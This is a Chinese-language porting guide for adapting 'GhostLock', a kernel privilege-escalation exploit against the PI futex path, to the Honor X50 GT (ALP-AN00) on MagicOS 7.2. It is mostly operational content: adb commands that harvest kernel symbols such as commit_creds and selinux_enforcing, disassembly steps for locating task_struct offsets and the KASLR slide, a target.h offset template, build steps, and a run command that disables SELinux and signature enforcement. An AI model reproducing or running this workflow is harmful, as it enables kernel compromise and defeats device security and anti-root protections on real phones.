# X50 GT (ALP-AN00) GhostLock 适配指南

**设备**: Honor X50 GT (ALP-AN00)
**固件**: Magic OS 7.2.0.162
**内核**: 5.10.136-android12-9-g43c5ee5a3463
**平台**: Qualcomm
**日期**: 2026-08-31

---

## 一、适配可行性评估

### 1.1 与已知工作设备对比

| 特性 | H80 GT (AGT-AN00) | X50 (ALI-AN00) | X50 GT (ALP-AN00) |
|------|-------------------|----------------|-------------------|
| 内核版本 | 5.10.168 | 5.10.209 | **5.10.136** |
| MagicOS | 8.0.0.128 | 8.0.0.181 | **7.2.0.162** |
| GhostLock 状态 | 已验证 | 已验证 | **待适配** |
| 芯片平台 | Qualcomm | Qualcomm | Qualcomm |
| ARM64 Image | 有 | 有 | 有 (49.9MB) |

### 1.2 关键发现

1. **内核比两个已知工作版本都老** (5.10.136 < 5.10.168 < 5.10.209)
   - 代码更接近原始 5.10 主线
   - PI futex 路径的代码结构应该存在
   - 更老的版本意味着更少的 upstream 修复

2. **内核 Image 已提取**
   - 路径: `F:/hdc_magic/GhostLock-H80GT/x50gt_analysis/x50gt_kernel/Image`
   - 大小: 49.9 MB (ARM64 uncompressed)
   - text_offset=0, image_size=52363264

3. **符号字符串搜索** 不能可靠判断符号是否存在
   - `remove_waiter` 可能被内联
   - `pi_blocked_on` 是结构体字段，不会出现在符号表
   - 需要反汇编确认

### 1.3 适配难度评估

| 工作项 | 难度 | 预计时间 | 说明 |
|--------|------|----------|------|
| 反编译找 task_struct PI 偏移 | 中 | 2-3h | 搜索 rt_mutex_setprio 指令 |
| 找 KIMAGE_TEXT_BASE | 低 | 0.5h | 从 Image header 或 /proc/iomem |
| 找 sysctl_bootid 偏移 | 中 | 1-2h | 搜索 proc_do_uuid 引用 |
| 找 commit_creds 地址 | 低 | 0.5h | /proc/kallsyms 或反汇编 |
| 找 rscan_skip_flag 偏移 | 高 | 1-2h | 需要确认 Honor antiroot 版本 |
| 创建 target.h | 中 | 1h | 基于 ALI-AN00 模板 |
| 编译测试 | 低 | 0.5h | NDK 编译 |

---

## 二、适配步骤

### 第1步: 获取设备运行时信息

**需要设备在手**，通过 ADB 获取：

```bash
# 1. 内核版本和符号基址
adb shell cat /proc/version
adb shell cat /proc/kallsyms | grep "T commit_creds"
adb shell cat /proc/kallsyms | grep "T init_task"
adb shell cat /proc/kallsyms | grep "D selinux_enforcing"
adb shell cat /proc/kallsyms | grep "D sig_enforce"

# 2. 内存布局
adb shell cat /proc/iomem | grep -i "kernel code"
adb shell cat /proc/iomem | grep -i "ram"

# 3. 检查关键配置
adb shell zcat /proc/config.gz | grep -E "FUTEX|PI_BLOCKED|MODULE_SIG"

# 4. 安全状态
adb shell getenforce
adb shell cat /sys/module/module/parameters/sig_enforce
```

### 第2步: 反编译内核 Image 找偏移

**用 IDA Pro 加载提取的 Image**:

```
文件: F:/hdc_magic/GhostLock-H80GT/x50gt_analysis/x50gt_kernel/Image
加载地址: 0xffffffc008000000 (推测，与 H80GT/ALI-AN00 相同)
架构: ARM64 Little-endian
```

#### 2a. 找 task_struct PI 偏移

**参考 ALI-AN00 的偏移**:
```
pi_lock:        0x8a4
pi_waiters:     0x8b8
pi_top_task:    0x8c8
pi_blocked_on:  0x8d0
```

**验证方法**:
```python
# 在 IDA 中搜索 remove_waiter 或 rt_mutex_setprio 函数
# 函数特征: 包含对 task_struct 的 pi_blocked_on 字段的访问
# 指令模式: ldr x8, [x0, #0x8d0] 或 str x8, [x0, #0x8d0]

# 搜索 crc8 或 checksum 函数来定位 rt_mutex 相关代码
# rt_mutex_setprio 特征: 调用 rt_mutex_adjust_prio 和 rt_mutex_setprio
```

#### 2b. 找 KIMAGE_TEXT_BASE

方法1: 从 Image 头解析
```python
# ARM64 Image header at offset 0
# text_offset at offset 8 (8 bytes, LE)
# 标准 KIMAGE_TEXT_BASE = 0xffffffc008000000 + text_offset
```

方法2: 从设备 /proc/iomem
```bash
adb shell cat /proc/iomem | grep "Kernel code"
# 输出类似: a8000000-xxxxxx: Kernel code
# KIMAGE_TEXT_BASE = 0xffffffc000000000 + phys_addr
```

#### 2c. 找 sysctl_bootid 偏移

**参考 ALI-AN00**:
```
boot_id ctl entry: 0x2e29e30
boot_id data buffer: 0x3069d1d (+3 aligned = 0x3069d20)
```

**搜索方法**:
```
# 在 IDA 中搜索 proc_do_uuid 的引用
# 找到 random_table 数组
# 每个 ctl_table entry 包含:
#   +0: procname (char*)
#   +8: data (void*)
#   +16: maxlen
#   +24: mode
#   +32: proc_handler (指向 proc_do_uuid)
# 搜索 "boot_id" 字符串的交叉引用
```

#### 2d. 找 commit_creds 地址

**方法**: 设备 /proc/kallsyms 或 IDA 搜索
```bash
adb shell cat /proc/kallsyms | grep " T commit_creds"
# 输出: ffffffc0081725ac T commit_creds
# 如果 kallsyms 被剥离: 用 IDA 搜索
# 函数特征: 开头 paciasp + 保存 x29/x30 + ldr x8,[x0,#cred_offset]
```

#### 2e. 找 rscan_skip_flag

**需要确认 Honor antiroot 机制版本**:
```
# MagicOS 7.2 可能没有 hw_rscan antiroot
# 检查方法: 搜索 rscan 或 antiroot 字符串
# 如果没有 rscan: 可以省略 RSCAN_SKIP_FLAG
```

### 第3步: 创建 target.h

**参考文件**: `exploit/src/targets/parrot-ALI-AN00_8.0.0.181/target.h`

创建新目录: `exploit/src/targets/alp-ALP-AN00_7.2.0.162/`

**需要填入的偏移** (所有值需要从反汇编或设备获取):

```c
#ifndef TARGET_H
#define TARGET_H

// Honor X50 GT (ALP-AN00), MagicOS 7.2.0.162, Android 12
// Kernel 5.10.136-android12-9-g43c5ee5a3463

#define BUILD_VARIANT_LABEL "alp_alp_an00_7_2_0_162"
#define BUILD_FINGERPRINT "HONOR/ALP-AN00/HNALP:12/HONORALP-AN00/7.2.0.162CNC00E155R6P3:user/release-keys"

// Memory layout
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL  // 推测, 需验证
#define P0_PAGE_OFFSET 0xffffff8000000000ULL    // 推测, 需验证

// Symbols (所有值需验证)
#define INIT_TASK_OFF         ???  // 从 kallsyms 或反汇编
#define INIT_CRED_OFF         ???  // 从 kallsyms
#define SELINUX_ENFORCING_OFF ???  // selinux_state 地址
#define SIG_ENFORCE_OFF       ???  // sig_enforce 地址
#define RSCAN_SKIP_FLAG_OFF   ???  // 可能不存在 (MagicOS 7.2)

// PI offsets (从反汇编确认)
#define PI_LOCK_OFF       0x8a4  // 推测与 ALI-AN00 相同
#define PI_WAITERS_OFF    0x8b8
#define PI_TOP_TASK_OFF   0x8c8
#define PI_BLOCKED_ON_OFF 0x8d0

// KASLR slide
#define SLIDE_BOOTID_CTL_OFF   ???  // 从反汇编
#define SLIDE_BOOTID_DATA_OFF  ???  // 从反汇编
#define SLIDE_RT_SCHED_CLASS_OFF ???  // 从 kallsyms

#endif
```

### 第4步: 编译

```bash
cd F:/hdc_magic/GhostLock-H80GT/exploit
NDK=/d/android-ndk-r27-windows/android-ndk-r27
CC="$NDK/toolchains/llvm/prebuilt/windows-x86_64/bin/aarch64-linux-android35-clang.cmd" \
"$NDK/prebuilt/windows-x86_64/bin/make.exe" PROJECT=alp-ALP-AN00_7.2.0.162 bin
```

### 第5步: 测试

```bash
# 推送 exploit
adb push exploit/build/alp-ALP-AN00_7.2.0.162/bin/exploit_static /data/local/tmp/

# 运行
adb shell chmod 755 /data/local/tmp/exploit_static
adb shell SE_LINUX=1 FLIP_SIG=1 /data/local/tmp/exploit_static
```

---

## 三、与 X50 (ALI-AN00) 适配的差异

| 差异项 | ALI-AN00 (X50) | ALP-AN00 (X50 GT) | 影响 |
|--------|---------------|-------------------|------|
| 内核版本 | 5.10.209 | 5.10.136 | PI 偏移可能相同，但需验证 |
| MagicOS | 8.0 | 7.2 | antiroot 机制可能不同 |
| kallsyms | 部分剥离 | 未知 | 需要设备确认 |
| rscan antiroot | 存在 | 可能不存在 | 简化！ |
| commit_creds | 0x1725ac | 不同 | 从 kallsyms 获取 |

---

## 四、需要设备确认的关键信息

**优先级 P0**:
1. `/proc/kallsyms` 中 commit_creds 地址
2. `/proc/kallsyms` 中 init_task 地址
3. `/proc/kallsyms` 中 rt_sched_class 地址
4. `/proc/iomem` 中 Kernel code 物理地址

**优先级 P1**:
5. `/proc/config.gz` 中 CONFIG_FUTEX_PI 是否启用
6. `/proc/kallsyms` 中是否有 remove_waiter 符号
7. Honor antiroot 机制是否存在

**优先级 P2**:
8. rscan 相关字符串是否存在
9. selinux 状态

---

## 五、当前状态

- [x] boot.img 提取
- [x] 内核 Image 解压 (49.9MB ARM64)
- [x] 确认 ARM64 格式有效
- [ ] 设备运行时信息获取 (需要设备)
- [ ] IDA 反编译找 task_struct PI 偏移
- [ ] 创建 target.h
- [ ] 编译测试